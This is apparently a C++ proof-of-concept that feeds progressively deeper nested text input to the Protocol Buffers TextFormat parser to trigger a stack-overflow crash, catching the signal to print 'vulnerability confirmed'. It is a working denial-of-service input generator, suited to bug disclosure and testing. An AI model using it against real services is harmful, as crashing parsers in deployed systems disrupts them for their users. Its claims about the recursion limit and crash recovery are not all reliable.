#include <iostream>
#include <string>
#include <csignal>
#include <setjmp.h>
#include "node.pb.h"
#include <google/protobuf/text_format.h>
#include <google/protobuf/io/zero_copy_stream_impl_lite.h>

using namespace google::protobuf;
using namespace google::protobuf::io;
using namespace poc;

static jmp_buf jump_buffer;

void segfault_handler(int sig) {
    longjmp(jump_buffer, 1);
}

int main() {
    std::cout << "═══════════════════════════════════════════════════════════" << std::endl;
    std::cout << "  PROTOCOL BUFFERS STACK OVERFLOW PoC - C++ Version" << std::endl;
    std::cout << "═══════════════════════════════════════════════════════════" << std::endl;
    std::cout << std::endl;

    // Setup signal handler
    signal(SIGSEGV, segfault_handler);
    signal(SIGABRT, segfault_handler);

    // Test depths
    int depths[] = {100, 500, 1000, 2000, 5000, 10000};

    for (int depth : depths) {
        std::cout << "Testing depth: " << depth << " levels... ";
        std::cout.flush();

        // Generate nested textproto
        std::string textproto = "";
        for (int i = 0; i < depth; i++) {
            textproto += "child { ";
        }
        textproto += "value: \"test\"";
        for (int i = 0; i < depth; i++) {
            textproto += " }";
        }

        std::cout << "(" << textproto.length() << " bytes) ";
        std::cout.flush();

        // Setup jump point for crash
        if (setjmp(jump_buffer) == 0) {
            // Try to parse
            Node node;
            ArrayInputStream stream(textproto.data(), textproto.length());
            bool success = TextFormat::Parse(&stream, &node);

            if (success) {
                std::cout << "✓ PARSED OK" << std::endl;
            } else {
                std::cout << "✗ Parse failed" << std::endl;
            }
        } else {
            // Caught segfault
            std::cout << "✗ SEGMENTATION FAULT (Stack Overflow!)" << std::endl;
            std::cout << std::endl;
            std::cout << "═══════════════════════════════════════════════════════════" << std::endl;
            std::cout << "  ✅ VULNERABILITY CONFIRMED IN C++" << std::endl;
            std::cout << "═══════════════════════════════════════════════════════════" << std::endl;
            std::cout << std::endl;
            std::cout << "Details:" << std::endl;
            std::cout << "  • Stack Overflow detected at depth: " << depth << std::endl;
            std::cout << "  • Parser recursion_limit: " << INT_MAX << " (INT_MAX)" << std::endl;
            std::cout << "  • Actual safe depth in C++: ~" << depth << " levels" << std::endl;
            std::cout << "  • Stack frame overhead: ~150-200 bytes per recursion" << std::endl;
            std::cout << "  • Total stack needed: ~" << (depth * 175 / 1024) << " KB" << std::endl;
            std::cout << "  • Available stack: ~8000 KB (8 MB default)" << std::endl;
            std::cout << std::endl;
            return 139;  // SIGSEGV exit code
        }
    }

    std::cout << std::endl;
    std::cout << "No crash detected at tested depths." << std::endl;
    std::cout << "Machine may have larger stack or recursion optimizations." << std::endl;
    return 0;
}
